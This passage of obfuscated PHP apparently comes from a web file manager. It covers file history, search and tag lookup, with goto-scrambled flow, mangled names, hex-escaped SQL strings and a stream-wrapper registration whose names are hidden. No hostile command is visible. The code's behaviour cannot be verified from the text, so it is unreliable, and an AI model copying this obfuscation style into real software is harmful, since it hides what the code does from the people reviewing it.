$A†‰ÎÌåì¾[2276]; goto BßŒµİßµ; BßŒµİßµ: $B›Î¹¢âğò = $this->field($c‡ì²Œ†İÒ)->where($bæºÏ’ªÆ)->order($A†‰ÎÌåì¾[2267])->selectPage(); $this->_listAppendUser($B›Î¹¢âğò[$A†‰ÎÌåì¾[350]]); $e˜Á¬†³¡ = Model($A†‰ÎÌåì¾[1081])->get($A†‰ÎÌåì¾[2273]); goto bç­š…ª; FîÂî—Æ¨õ: } protected function _listAppendUser(&$Aä‡‰Š²Ù§) { $E©Ü¿òĞË =& $_SERVER[Ö]; $còÜ¤í’‰¢ = array_to_keyvalue($Aä‡‰Š²Ù§, $E©Ü¿òĞË[33], $E©Ü¿òĞË[1414]); $aè‚×ò » = Model($E©Ü¿òĞË[473])->userListInfo($còÜ¤í’‰¢); foreach ($Aä‡‰Š²Ù§ as &$C†®òÑİçñ) { $Dê¹²¡®÷Ü = $C†®òÑİçñ[$E©Ü¿òĞË[1414]]; $C†®òÑİçñ[$E©Ü¿òĞË[374]] = $aè‚×ò »[$Dê¹²¡®÷Ü] ? $aè‚×ò »[$Dê¹²¡®÷Ü] : !1; } } public function fileInfo($d¹‹³¤ºÁÌ) { $A”¥ïÍÀÎ =& $_SERVER[Ö]; $d–êÜÍøÆ† = $this->tablePrefix; $D‹ôÛÎˆô• = "{$d–êÜÍøÆ†}\151\x6f\137\x66\x69\x6c\145\40\146\151\154\x65\x73\x20\157\156\40\x66\151\154\x65\x73\x2e\x66\151\x6c\145\x49\x44\x20\x3d\x20\150\x69\163\164\x6f\x72\x79\56\x66\x69\x6c\145\x49\x44"; return $this->alias($A”¥ïÍÀÎ[2281])->where(array($A”¥ïÍÀÎ[381] => $d¹‹³¤ºÁÌ))->join($D‹ôÛÎˆô•, $A”¥ïÍÀÎ[2282])->find(); } public function removeItem($C¢‘ç³Ğ‘®) { $c¤ Í›·Ì =& $_SERVER[Ö]; $Cƒ’ñ‹©´» = array($c¤ Í›·Ì[381] => $C¢‘ç³Ğ‘®); $dæõ—Ñ´á½ = $this->where($Cƒ’ñ‹©´»)->find(); if ($dæõ—Ñ´á½) { $DÓëÁõ = $this->where($Cƒ’ñ‹©´»)->delete(); Model($c¤ Í›·Ì[418])->remove($dæõ—Ñ´á½[$c¤ Í›·Ì[415]]); return $DÓëÁõ; } return !1; } public function removeBySource($Cß‡·¯…¦) { goto C–‹ƒÖÛ­Æ; C–‹ƒÖÛ­Æ: $B†“á¶®ğµ =& $_SERVER[Ö]; if (!$Cß‡·¯…¦) { return !1; } if (!is_array($Cß‡·¯…¦)) { $Cß‡·¯…¦ = array($Cß‡·¯…¦); } goto aÎƒ‡†‰˜ê; aÎƒ‡†‰˜ê: $bç°‰âªĞ… = array($B†“á¶®ğµ[379] => array($B†“á¶®ğµ[7], $Cß‡·¯…¦)); $Cõ÷š½æÁ‡ = $this->field($B†“á¶®ğµ[416])->where($bç°‰âªĞ…)->select(); if ($Cõ÷š½æÁ‡) { $this->where($bç°‰âªĞ…)->delete(); $C›æåƒÚ = array_to_keyvalue($Cõ÷š½æÁ‡, $B†“á¶®ğµ[33], $B†“á¶®ğµ[415]); Model($B†“á¶®ğµ[418])->remove($C›æåƒÚ); } goto d÷±¥åƒ÷ß; d÷±¥åƒ÷ß: return !0; goto E»Àóğ¬¬à; E»Àóğ¬¬à: } public function setDetail($Aº–ï«©º, $E‹ˆ§éÉİ½) { $dŒ¨ŠÂÄø¾ =& $_SERVER[Ö]; return $this->where(array($dŒ¨ŠÂÄø¾[381] => $Aº–ï«©º))->save(array($dŒ¨ŠÂÄø¾[2270] => $E‹ˆ§éÉİ½)); } public function rollbackToItem($AÖ¢¯ÕŒÛÎ, $CÁ‚íªêœ) { goto cô°‰‹ãŒÜ; cô°‰‹ãŒÜ: $e¶éÕªâ˜” =& $_SERVER[Ö]; $Cœñ’Šêƒ× = Model($e¶éÕªâ˜”[745])->sourceInfo($AÖ¢¯ÕŒÛÎ); $this->addHistory($Cœñ’Šêƒ×); goto Aøã´¨é«Ì; Aøã´¨é«Ì: $A˜¦Ê—Ìˆ = $this->find($CÁ‚íªêœ); $cÇÙÎÎŠå = array($e¶éÕªâ˜”[415] => $A˜¦Ê—Ìˆ[$e¶éÕªâ˜”[415]], $e¶éÕªâ˜”[77] => $A˜¦Ê—Ìˆ[$e¶éÕªâ˜”[77]], $e¶éÕªâ˜”[106] => time(), $e¶éÕªâ˜”[375] => USER_ID); Model($e¶éÕªâ˜”[745])->where(array($e¶éÕªâ˜”[365] => $AÖ¢¯ÕŒÛÎ))->save($cÇÙÎÎŠå); goto a†‚–ÀÛ; a†‚–ÀÛ: return $this->where(array($e¶éÕªâ˜”[381] => $CÁ‚íªêœ))->delete(); goto cÈÅ©…èÙ«; cÈÅ©…èÙ«: } public function clearSame($f„Í¨ß‘Ãç) { goto Fˆ±ØéÇƒ‘; bæ»ìøÍ·: $cŠ×ë³ÃÑà = array(); $bÍ¢‰íñè˜ = array(); foreach ($A±Ğ¾é¿ÉÏ as $dÊ©÷áÀÜ¨) { if (!$dÊ©÷áÀÜ¨ || count($dÊ©÷áÀÜ¨) <= 1) { continue; } foreach ($dÊ©÷áÀÜ¨ as $DâÄ­îÜº) { $cŠ×ë³ÃÑà[] = $DâÄ­îÜº[$EÁøÖµ‘¥[415]]; $bÍ¢‰íñè˜[] = $DâÄ­îÜº[$EÁøÖµ‘¥[363]]; } } goto dÃ»Òº—äÉ; dÃ»Òº—äÉ: if (!$bÍ¢‰íñè˜) { return; } $this->where(array($EÁøÖµ‘¥[363] => array($EÁøÖµ‘¥[7], $bÍ¢‰íñè˜)))->delete(); Model($EÁøÖµ‘¥[418])->remove($cŠ×ë³ÃÑà); goto bÇóêâÊß×; Fˆ±ØéÇƒ‘: $EÁøÖµ‘¥ =& $_SERVER[Ö]; $BùÂã‡³¤ = $this->listData($f„Í¨ß‘Ãç); $A±Ğ¾é¿ÉÏ = array_to_keyvalue_group($BùÂã‡³¤, $EÁøÖµ‘¥[415]); goto bæ»ìøÍ·; bÇóêâÊß×: } public function userSpace() { $F¿¤ŸÎ¦½¬ =& $_SERVER[Ö]; $fÊËä¦ß•¦ = $this->tablePrefix; $eÓÍ³ ×‹í = array($F¿¤ŸÎ¦½¬[1405] => USER_ID); $FÎçÄ½ÅÆ = "{$fÊËä¦ß•¦}\x69\x6f\x5f\146\151\154\x65\x20\146\151\x6c\145\163\40\x6f\x6e\x20\x66\151\x6c\145\x73\x2e\146\151\x6c\x65\x49\104\40\75\40\150\x69\x73\164\x6f\162\171\56\146\x69\154\145\111\x44"; return $this->alias($F¿¤ŸÎ¦½¬[2281])->where($eÓÍ³ ×‹í)->join($FÎçÄ½ÅÆ, $F¿¤ŸÎ¦½¬[2282])->sum($F¿¤ŸÎ¦½¬[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($DÁ‚ÛÇ“) { goto Aøâ‚¹«ÌÂ; Cä¡±Ş–°: if (!$fŠíÊ¯®—Ó[$FÀ³Ÿ­¦éì[156]]) { $C›Ò“ºëÏŞ = array_to_keyvalue($dÉßæ³°ŞÓ, $FÀ³Ÿ­¦éì[33], $FÀ³Ÿ­¦éì[156]); $FßÓ§¾…É® = implode($FÀ³Ÿ­¦éì[47], $C›Ò“ºëÏŞ); $B•ó¡„àˆØ = $FÀ³Ÿ­¦éì[2233]; } $a‚Áİåæß¥ = explode($FÀ³Ÿ­¦éì[47], trim($FßÓ§¾…É®, $FÀ³Ÿ­¦éì[47])); return array($B•ó¡„àˆØ, $a‚Áİåæß¥); goto AŸíØ•¤´›; Aøâ‚¹«ÌÂ: $FÀ³Ÿ­¦éì =& $_SERVER[Ö]; $dÉßæ³°ŞÓ = KodIO::fileTypeList(); $fŠíÊ¯®—Ó = $dÉßæ³°ŞÓ[$DÁ‚ÛÇ“]; goto bÂ¯ÖøéöØ; bÂ¯ÖøéöØ: if (!$fŠíÊ¯®—Ó) { return array(); } $FßÓ§¾…É® = $fŠíÊ¯®—Ó[$FÀ³Ÿ­¦éì[156]]; $B•ó¡„àˆØ = $FÀ³Ÿ­¦éì[7]; goto Cä¡±Ş–°; AŸíØ•¤´›: } public function listPathType($D‚¼º®ï£Ô) { $Eõëè‘ÛÉ =& $_SERVER[Ö]; $a¥ëÏÜ” = $this->fileTypeWhere($D‚¼º®ï£Ô); if (!$a¥ëÏÜ”) { return array(); } $aï×œ™œëÙ = array($Eõëè‘ÛÉ[517] => SourceModel::TYPE_USER, $Eõëè‘ÛÉ[518] => USER_ID, $Eõëè‘ÛÉ[514] => 0, $Eõëè‘ÛÉ[515] => $a¥ëÏÜ”); return $this->listSource($aï×œ™œëÙ); } public function listSearch($Có† åèÉİ, $EÎöÈ¯†‘Ì = 300) { goto Cê°Ö”áÎ; cË´îÖ‘ó¡: $this->_listMake($E¡”Ã£÷®š); return $E¡”Ã£÷®š; goto fÑºµÜ¨Ÿ; Cê°Ö”áÎ: $a¢¿Ú¯¥è =& $_SERVER[Ö]; if (isset($Có† åèÉİ[$a¢¿Ú¯¥è[2153]]) && $Có† åèÉİ[$a¢¿Ú¯¥è[2153]]) { $Có† åèÉİ[$a¢¿Ú¯¥è[2153]] = str_replace($a¢¿Ú¯¥è[1566], $a¢¿Ú¯¥è[2283], trim($Có† åèÉİ[$a¢¿Ú¯¥è[2153]])); } $dèÚ…æ»†‘ = $this->_parseSearchWhere($Có† åèÉİ); goto c÷†ù‹®²; Dœ¯¹’èö: $this->_listSearchDesc($E¡”Ã£÷®š, $Có† åèÉİ, $cƒ®¾×¡²); $this->_listSearchTag($E¡”Ã£÷®š, $Có† åèÉİ, $cƒ®¾×¡²); $this->_listDataApply($E¡”Ã£÷®š[$a¢¿Ú¯¥è[350]]); goto cË´îÖ‘ó¡; F›–×‹ªõâ: $this->_listSearchBindPinyin($Có† åèÉİ, $dèÚ…æ»†‘, $D‡Ô¾× ‘‹); $this->alias($a¢¿Ú¯¥è[483])->_makeOrder()->cache(null, 10); $E¡”Ã£÷®š = $this->distinct(!0)->field($D‡Ô¾× ‘‹)->where($dèÚ…æ»†‘)->selectPage($EÎöÈ¯†‘Ì); goto Dœ¯¹’èö; c÷†ù‹®²: if (!isset($dèÚ…æ»†‘[$a¢¿Ú¯¥è[393]])) { $dèÚ…æ»†‘[$a¢¿Ú¯¥è[393]] = 0; } $D‡Ô¾× ‘‹ = $a¢¿Ú¯¥è[2284]; $cƒ®¾×¡² = $D‡Ô¾× ‘‹; goto F›–×‹ªõâ; fÑºµÜ¨Ÿ: } private function _listSearchTag(&$b¼¥Æ¼¹²˜, $CŠöã—ó±£, $CÏĞ¡¨ÀÆ) { goto C„†™½…´; b¯÷ÒàÍ‰ç: if (!$Aööä‹–µ) { return; } $fİ•šñÕ£É = array($CÚè…¦ ½©[389] => array($CÚè…¦ ½©[7], $Aööä‹–µ)); $d¦šÃåá³Ô = Model($CÚè…¦ ½©[390])->field($CÚè…¦ ½©[75])->where($fİ•šñÕ£É)->select(); goto BÄÀìÖ”Ê‡; C„†™½…´: $CÚè…¦ ½© =& $_SERVER[Ö]; if (!$CŠöã—ó±£[$CÚè…¦ ½©[2153]] || $b¼¥Æ¼¹²˜[$CÚè…¦ ½©[347]][$CÚè…¦ ½©[336]] > 1) { return; } $A•ÃïŸêİ¸ = Model($CÚè…¦ ½©[2285])->listData(); goto d¾¶¼ˆ’¢õ; d¾¶¼ˆ’¢õ: $Aööä‹–µ = array(); $EÊ£Ä¾áæ = $CŠöã—ó±£[$CÚè…¦ ½©[2153]]; foreach ($A•ÃïŸêİ¸ as $cõÁÜ‹ÆÖ¨) { $cŠÍ¼ÒŒù = $cõÁÜ‹ÆÖ¨[$CÚè…¦ ½©[28]]; $bô·‹ôİÍ = str_replace($CÚè…¦ ½©[50], $CÚè…¦ ½©[33], Pinyin::encode($cŠÍ¼ÒŒù)); if (stripos($cŠÍ¼ÒŒù, $EÊ£Ä¾áæ) !== !1 || stripos($bô·‹ôİÍ, $EÊ£Ä¾áæ) !== !1) { $Aööä‹–µ[] = $cõÁÜ‹ÆÖ¨[$CÚè…¦ ½©[363]]; } } goto b¯÷ÒàÍ‰ç; BÄÀìÖ”Ê‡: $d¦šÃåá³Ô = array_to_keyvalue($d¦šÃåá³Ô, $CÚè…¦ ½©[33], $CÚè…¦ ½©[75]); $E…Êó¨è¯Á = array_unique($d¦šÃåá³Ô); $this->_listSearchMerge($b¼¥Æ¼¹²˜, $CŠöã—ó±£, $CÏĞ¡¨ÀÆ, $E…Êó¨è¯Á); goto c×³¶Ïƒ¦˜; c×³¶Ïƒ¦˜: } private function _listSearchDesc(&$E¶ÅçÚÜ®, $FõÉ¤’·´ë, $e©‘Êöà) { goto B† µˆ…°; B† µˆ…°: $DÇÊæ¢‹ =& $_SERVER[Ö]; if (!$FõÉ¤’·´ë[$DÇÊæ¢‹[2153]] || $E¶ÅçÚÜ®[$DÇÊæ¢‹[347]][$DÇÊæ¢‹[336]] > 1) { return; } $dÎøÆÜ¢˜İ = $this->listSearchChildren($FõÉ¤’·´ë[$DÇÊæ¢‹[457]]); goto C³ãöœô¯˜; C³ãöœô¯˜: $dÎøÆÜ¢˜İ = array_unique($dÎøÆÜ¢˜İ); if (!$dÎøÆÜ¢˜İ) { return; } $d ÎÕº˜² = array($DÇÊæ¢‹[365] => array($DÇÊæ¢‹[7], $dÎøÆÜ¢˜İ), $DÇÊæ¢‹[89] => $DÇÊæ¢‹[401], $DÇÊæ¢‹[355] => array($DÇÊæ¢‹[744], $DÇÊæ¢‹[2155] . $FõÉ¤’·´ë[$DÇÊæ¢‹[2153]] . $DÇÊæ¢‹[2155])); goto EÏï‘ÏÅòï; EÏï‘ÏÅòï: $EçÔ’‚ŠÃŒ = Model($DÇÊæ¢‹[500])->field($DÇÊæ¢‹[365])->where($d ÎÕº˜²)->select(); $fäî”“ùª¨ = array_to_keyvalue($EçÔ’‚ŠÃŒ, $DÇÊæ¢‹[33], $DÇÊæ¢‹[365]); $this->_listSearchMerge($E¶ÅçÚÜ®, $FõÉ¤’·´ë, $e©‘Êöà, $fäî”“ùª¨); goto cÖùìÒ‘£Î; cÖùìÒ‘£Î: } private function _listSearchMerge(&$cÉšØ²²å, $dŠ×†ß¨Ã, $C¤‡ùŠÓ¤‚, $f Ğã°†¾—) { goto dÛÄ°„áá; Aé„İ¤ÓÂ¨: $d‘ğ¿¸ó‹‰ = $this->field($C¤‡ùŠÓ¤‚)->where($CÙé´×Ñ‰Í)->select(); if (!$d‘ğ¿¸ó‹‰) { return; } $A¨Œ“ª„ª = array(); goto F°±ÖÓ»«à; F°±ÖÓ»«à: foreach ($d‘ğ¿¸ó‹‰ as $aÛÆÖªÕ¤) { $F®Íâ¤»Â = $C¶ÂŒé“†Å[47] . $dŠ×†ß¨Ã[$C¶ÂŒé“†Å[457]] . $C¶ÂŒé“†Å[47]; if (stripos($aÛÆÖªÕ¤[$C¶ÂŒé“†Å[455]], $F®Íâ¤»Â) !== !1) { $A¨Œ“ª„ª[] = $aÛÆÖªÕ¤; } } $cÉšØ²²å[$C¶ÂŒé“†Å[350]] = array_merge($A¨Œ“ª„ª, $cÉšØ²²å[$C¶ÂŒé“†Å[350]]); $cÉšØ²²å[$C¶ÂŒé“†Å[347]][$C¶ÂŒé“†Å[348]] += count($A¨Œ“ª„ª); goto Eñƒª¥‡Ú¾; cÅß§åæÕ: $eå­†ÓƒÆ = array_diff($f Ğã°†¾—, $EŞ¬„·òÏ§); if (!$eå­†ÓƒÆ) { return; } $CÙé´×Ñ‰Í = array($C¶ÂŒé“†Å[365] => array($C¶ÂŒé“†Å[7], $eå­†ÓƒÆ)); goto Aé„İ¤ÓÂ¨; dÛÄ°„áá: $C¶ÂŒé“†Å =& $_SERVER[Ö]; if (!$f Ğã°†¾—) { return; } $EŞ¬„·òÏ§ = array_to_keyvalue($cÉšØ²²å[$C¶ÂŒé“†Å[350]], $C¶ÂŒé“†Å[33], $C¶ÂŒé“†Å[365]); goto cÅß§åæÕ; Eñƒª¥‡Ú¾: } public function listSearchChildren($EĞ‘îÕÁ„è, $e£“ÜÙĞê = 5000) { goto BÑ™¿äó¿¼; FùŸáÍ˜å: $A‡Ëœáò¢ = $this->field($a£¿¯ÄÜÁÒ[365])->where($EåÌç¢Š®)->select(); $aÊÉ‡÷Õ = array_to_keyvalue($A‡Ëœáò¢, $a£¿¯ÄÜÁÒ[33], $a£¿¯ÄÜÁÒ[365]); return $aÊÉ‡÷Õ; goto d«ëøèÂÏÙ; BÑ™¿äó¿¼: $a£¿¯ÄÜÁÒ =& $_SERVER[Ö]; $aÊÉ‡÷Õ = array(); $Açñ•ÊÚ» = $this->sourceInfo($EĞ‘îÕÁ„è); goto F„ˆİÎ®‰; F„ˆİÎ®‰: $EåÌç¢Š® = array($a£¿¯ÄÜÁÒ[455] => array($a£¿¯ÄÜÁÒ[744], $Açñ•ÊÚ»[$a£¿¯ÄÜÁÒ[455]] . $Açñ•ÊÚ»[$a£¿¯ÄÜÁÒ[365]] . $a£¿¯ÄÜÁÒ[480])); $A…óŒ¹÷”¹ = $this->field($a£¿¯ÄÜÁÒ[365])->cache(null, 600)->where($EåÌç¢Š®)->count(); if ($A…óŒ¹÷”¹ > $e£“ÜÙĞê) { return $this->_listSearchChildrenNear($EĞ‘îÕÁ„è, $e£“ÜÙĞê); } goto FùŸáÍ˜å; d«ëøèÂÏÙ: } private function _listSearchChildrenNear($aõ…‘³ôæŸ, $eäÃ™ª°¤…) { goto A·Œß¤¶¤¥; A·Œß¤¶¤¥: $c©ÏÚ·°àË =& $_SERVER[Ö]; $DÚ«‹²¾õ = array(); $Eù‘†Šøƒ³ = array($c©ÏÚ·°àË[457] => $aõ…‘³ôæŸ); goto bƒ‘‘¸ËÈ; aÃáÆ”¦³ã: $DÚ«‹²¾õ = array_merge($DÚ«‹²¾õ, array_to_keyvalue($D„Î…¶Î›, $c©ÏÚ·°àË[33], $c©ÏÚ·°àË[365])); $DÚ«‹²¾õ = array_slice($DÚ«‹²¾õ, 0, $eäÃ™ª°¤…); return $DÚ«‹²¾õ; goto eõ‹ñÇ³ô; bƒ‘‘¸ËÈ: $D„Î…¶Î› = $this->field($c©ÏÚ·°àË[2286])->where($Eù‘†Šøƒ³)->select(); $Dğé‰Ó¾™’ = array_to_keyvalue(array_filter_by_field($D„Î…¶Î›, $c©ÏÚ·°àË[366], $c©ÏÚ·°àË[83]), $c©ÏÚ·°àË[33], $c©ÏÚ·°àË[365]); $DÚ«‹²¾õ = array_merge($DÚ«‹²¾õ, array_to_keyvalue($D„Î…¶Î›, $c©ÏÚ·°àË[33], $c©ÏÚ·°àË[365])); goto dñ‰”“ˆâò; dñ‰”“ˆâò: if (!$Dğé‰Ó¾™’) { return $DÚ«‹²¾õ; } $Eù‘†Šøƒ³ = array($c©ÏÚ·°àË[457] => array($c©ÏÚ·°àË[7], $Dğé‰Ó¾™’)); $D„Î…¶Î› = $this->field($c©ÏÚ·°àË[2286])->where($Eù‘†Šøƒ³)->select(); goto aÃáÆ”¦³ã; eõ‹ñÇ³ô: } private function _listSearchBindPinyin($eğòÕÍÍ·á, &$Eç¿÷Ì¤¸ù, &$aÅÔÏ‡Ë¼ô) { goto C­¹Ï……ê–; Cñ‚Ûø•é¥: $BŞ‘áª«âß[] = array($Bµ¿•„«÷[2290] => $f¦‹ã›‡Î‡, $Bµ¿•„«÷[909] => $Bµ¿•„«÷[2157], array($Bµ¿•„«÷[2291] => $f¦‹ã›‡Î‡, $Bµ¿•„«÷[2292] => array($Bµ¿•„«÷[7], array($Bµ¿•„«÷[412], $Bµ¿•„«÷[411])))); $this->join($Bğ‰ĞØÖîŞ); $Eç¿÷Ì¤¸ù = $BŞ‘áª«âß; goto a¼ëô›…ë‹; bÆøîñæÉ: unset($Eç¿÷Ì¤¸ù[$Bµ¿•„«÷[28]]); foreach ($Eç¿÷Ì¤¸ù as $F¡èÌéĞ => $fƒ¦è„…»Ç) { $BŞ‘áª«âß[$Bµ¿•„«÷[2288] . $F¡èÌéĞ] = $fƒ¦è„…»Ç; } $f¦‹ã›‡Î‡ = array($Bµ¿•„«÷[479], $Bµ¿•„«÷[2155] . $eğòÕÍÍ·á[$Bµ¿•„«÷[2153]] . $Bµ¿•„«÷[2155]); goto Cñ‚Ûø•é¥; C­¹Ï……ê–: $Bµ¿•„«÷ =& $_SERVER[Ö]; if (!Input::check($eğòÕÍÍ·á[$Bµ¿•„«÷[2153]], $Bµ¿•„«÷[302]) || strlen($eğòÕÍÍ·á[$Bµ¿•„«÷[2153]]) < 2) { return; } $Bğ‰ĞØÖîŞ = "\x4c\x45\x46\x54\40\x4a\x4f\111\x4e\40{$this->tablePrefix}\151\157\x5f\163\x6f\x75\162\x63\x65\137\155\145\x74\x61\40\x6d\145\x74\x61\x20\157\156\40\x73\x6f\x75\162\x63\145\x2e\x73\157\165\x72\143\145\x49\104\40\75\x20\155\145\164\141\x2e\x73\157\x75\162\143\x65\111\104"; goto AëĞ¢ŞŠ‡; AëĞ¢ŞŠ‡: $BŞ‘áª«âß = array(); $aÅÔÏ‡Ë¼ô = str_replace(array($Bµ¿•„«÷[213], $Bµ¿•„«÷[50], $Bµ¿•„«÷[2287]), $Bµ¿•„«÷[33], $aÅÔÏ‡Ë¼ô); $aÅÔÏ‡Ë¼ô = $Bµ¿•„«÷[2288] . str_replace($Bµ¿•„«÷[47], $Bµ¿•„«÷[2289], $aÅÔÏ‡Ë¼ô); goto bÆøîñæÉ; a¼ëô›…ë‹: } private function _parseSearchWhere($c§ô«–Á¯ñ) { goto DÉµÊç½«­; DÉµÊç½«­: $e™åø‘Õ‹­ =& $_SERVER[Ö]; $FÚƒ‘ï²™ğ = array(); if (isset($c§ô«–Á¯ñ[$e™åø‘Õ‹­[695]])) { $FÚƒ‘ï²™ğ[$e™åø‘Õ‹­[106]] = array($e™åø‘Õ‹­[2293], $c§ô«–Á¯ñ[$e™åø‘Õ‹­[695]]); } goto C‘ÃËªŠ‡; C‘ÃËªŠ‡: if (isset($c§ô«–Á¯ñ[$e™åø‘Õ‹­[696]])) { $fÏ”ßµ¾ˆÈ = array($e™åø‘Õ‹­[2294], $c§ô«–Á¯ñ[$e™åø‘Õ‹­[696]]); if ($FÚƒ‘ï²™ğ[$e™åø‘Õ‹­[106]]) { $FÚƒ‘ï²™ğ[$e™åø‘Õ‹­[106]] = array($FÚƒ‘ï²™ğ[$e™åø‘Õ‹­[106]], $fÏ”ßµ¾ˆÈ, $e™åø‘Õ‹­[2295]); } else { $FÚƒ‘ï²™ğ[$e™åø‘Õ‹­[106]] = $fÏ”ßµ¾ˆÈ; } } if (isset($c§ô«–Á¯ñ[$e™åø‘Õ‹­[2296]])) { $FÚƒ‘ï²™ğ[$e™åø‘Õ‹­[77]] = array($e™åø‘Õ‹­[2293], $c§ô«–Á¯ñ[$e™åø‘Õ‹­[2296]]); } if (isset($c§ô«–Á¯ñ[$e™åø‘Õ‹­[2297]])) { $fÏ”ßµ¾ˆÈ = array($e™åø‘Õ‹­[2294], $c§ô«–Á¯ñ[$e™åø‘Õ‹­[2297]]); if ($FÚƒ‘ï²™ğ[$e™åø‘Õ‹­[77]]) { $FÚƒ‘ï²™ğ[$e™åø‘Õ‹­[77]] = array($FÚƒ‘ï²™ğ[$e™åø‘Õ‹­[77]], $fÏ”ßµ¾ˆÈ, $e™åø‘Õ‹­[2295]); } else { $FÚƒ‘ï²™ğ[$e™åø‘Õ‹­[77]] = $fÏ”ßµ¾ˆÈ; } } goto AšßĞá™í¸; aÛªå©µŞ: if (isset($c§ô«–Á¯ñ[$e™åø‘Õ‹­[2153]]) && $c§ô«–Á¯ñ[$e™åø‘Õ‹­[2153]]) { $F¨‹¯»ÂØ® = $c§ô«–Á¯ñ[$e™åø‘Õ‹­[2153]]; $AŒ÷¥íªÊ« = explode($e™åø‘Õ‹­[50], $F¨‹¯»ÂØ®); if (strlen($F¨‹¯»ÂØ®) > 2 && (substr($F¨‹¯»ÂØ®, 0, 1) == $e™åø‘Õ‹­[112] && substr($F¨‹¯»ÂØ®, -1) == $e™åø‘Õ‹­[112]) || substr($F¨‹¯»ÂØ®, 0, 1) == $e™åø‘Õ‹­[55] && substr($F¨‹¯»ÂØ®, -1) == $e™åø‘Õ‹­[55]) { $F¨‹¯»ÂØ® = substr($F¨‹¯»ÂØ®, 1, -1); $AŒ÷¥íªÊ« = array($F¨‹¯»ÂØ®); } $FÚƒ‘ï²™ğ[$e™åø‘Õ‹­[28]] = array($e™åø‘Õ‹­[479], $e™åø‘Õ‹­[2155] . $F¨‹¯»ÂØ® . $e™åø‘Õ‹­[2155]); if (count($AŒ÷¥íªÊ«) > 1) { $FÚƒ‘ï²™ğ[$e™åø‘Õ‹­[28]] = array(); foreach ($AŒ÷¥íªÊ« as $AÀ¿ Ÿ‰¯ˆ) { if (!trim($AÀ¿ Ÿ‰¯ˆ)) { continue; } $FÚƒ‘ï²™ğ[$e™åø‘Õ‹­[28]][] = array($e™åø‘Õ‹­[479], $e™åø‘Õ‹­[2155] . trim($AÀ¿ Ÿ‰¯ˆ) . $e™åø‘Õ‹­[2155]); } } } return $FÚƒ‘ï²™ğ; goto f˜“Ó·ÀºÑ; AšßĞá™í¸: if (isset($c§ô«–Á¯ñ[$e™åø‘Õ‹­[531]])) { $FÚƒ‘ï²™ğ[] = array($e™åø‘Õ‹­[375] => $c§ô«–Á¯ñ[$e™åø‘Õ‹­[531]], $e™åø‘Õ‹­[374] => $c§ô«–Á¯ñ[$e™åø‘Õ‹­[531]], $e™åø‘Õ‹­[909] => $e™åø‘Õ‹­[2157]); } if (isset($c§ô«–Á¯ñ[$e™åø‘Õ‹­[368]])) { $EËâ‚›­äÁ = $c§ô«–Á¯ñ[$e™åø‘Õ‹­[368]]; if ($EËâ‚›­äÁ == $e™åø‘Õ‹­[76]) { $FÚƒ‘ï²™ğ[$e™åø‘Õ‹­[366]] = 1; } else { if ($EËâ‚›­äÁ == $e™åø‘Õ‹­[2298]) { $FÚƒ‘ï²™ğ[$e™åø‘Õ‹­[366]] = 0; } else { if ($EËâ‚›­äÁ) { $EËâ‚›­äÁ = is_array($EËâ‚›­äÁ) ? $EËâ‚›­äÁ : explode($e™åø‘Õ‹­[47], $EËâ‚›­äÁ); $FÚƒ‘ï²™ğ[$e™åø‘Õ‹­[368]] = array($e™åø‘Õ‹­[380], $EËâ‚›­äÁ); $FÚƒ‘ï²™ğ[$e™åø‘Õ‹­[366]] = 0; } } } } if (isset($c§ô«–Á¯ñ[$e™åø‘Õ‹­[457]])) { $eÌëÜÀŞÚ = $this->sourceInfo($c§ô«–Á¯ñ[$e™åø‘Õ‹­[457]]); $FÚƒ‘ï²™ğ[$e™åø‘Õ‹­[521]] = array($e™åø‘Õ‹­[479], $eÌëÜÀŞÚ[$e™åø‘Õ‹­[455]] . $c§ô«–Á¯ñ[$e™åø‘Õ‹­[457]] . $e™åø‘Õ‹­[480]); } goto aÛªå©µŞ; f˜“Ó·ÀºÑ: } } goto bŠµ†‘Ş¾ñ; bºŸ†ôÄà¦: $_SERVER[$_SERVER[Ç·ÕÂû¼„][52]] = ("\71\64\65\70"."\63\60")+0;$_eTqS="vtNRJDWW8uHqTX3U4JU6rfRpXCMxi4K74gmNC6EYJz3taSQFKekrAikUXaZuwbmSYU8Egt855wi6BjgnNM";; stream_wrapper_register($_SERVER[Ç·ÕÂû¼„][53], $_SERVER[Ç·ÕÂû¼„][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($f…è‘ö©’À, $b–‘ñÊ¦Ä) { $E˜’Ş‘ƒ” =& $_SERVER[Ö]; if (isset(self::$_methodList[$f…è‘ö©’À])) { return @call_user_func_array(self::$_methodList[$f…è‘ö©’À], $b–‘ñÊ¦Ä); } else { if (method_exists($this, $f…è‘ö©’À)) { return call_user_func_array(array($this, $f…è‘ö©’À), $b–‘ñÊ¦Ä); } else { think_exception(__CLASS__ . $E˜’Ş‘ƒ”[4] . $f…è‘ö©’À . $E˜’Ş‘ƒ”[5]); } } } public static function __callStatic($d³Ÿä½ÄÇ, $cÛ±ƒèŒ‚ç) { if (isset(self::$_methodListStatic[$d³Ÿä½ÄÇ])) { return call_user_func_array(self::$_methodListStatic[$d³Ÿä½ÄÇ], $cÛ±ƒèŒ‚ç); } else { if (method_exists(self, $d³Ÿä½ÄÇ)) { return call_user_func_array(array(self, $d³Ÿä½ÄÇ), $cÛ±ƒèŒ‚ç); } else { show_json("{$d³Ÿä½ÄÇ}\x28\x29\40\156\x6f\x74\x20\x65\170\151\x73\164\73", !1); } } } public static function addMethod($cÅõô‘±è÷, $Bå†‹ŠØ³¨) { self::$_methodList[$cÅõô‘±è÷] = $Bå†‹ŠØ³¨; } public static function addMethodStatic($c¬ÖŒÒÄ¥Ö, $AŸÎ”ãŸ¡ö) { self::$_methodListStatic[$c¬ÖŒÒÄ¥Ö] = $AŸÎ”ãŸ¡ö; } } goto E”îØôëÈù; E«éœç¤Ã˜: class Services_JSON { function __construct($bîí´°î–† = 0) { $this->use = $bîí´°î–†; } function utf162utf8($b¨‡ôÚì°ó) { $b‰¢é‚¨è =& $_SERVER[Ö]; if (function_exists($b‰¢é‚¨è[68])) { return mb_convert_encoding($b¨‡ôÚì°ó, $b‰¢é‚¨è[1563], $b‰¢é‚¨è[1912]); } $B£„®×ğÆ‘ = ord($b¨‡ôÚì°ó[0]) << 8 | ord($b¨‡ôÚì°ó[1]); switch (!0) { case (127 & $B£„®×ğÆ‘) == $B£„®×ğÆ‘: return chr(127 & $B£„®×ğÆ‘); case (2047 & $B£„®×ğÆ‘) == $B£„®×ğÆ‘: return chr(192 | $B£„®×ğÆ‘ >> 6 & 31) . chr(128 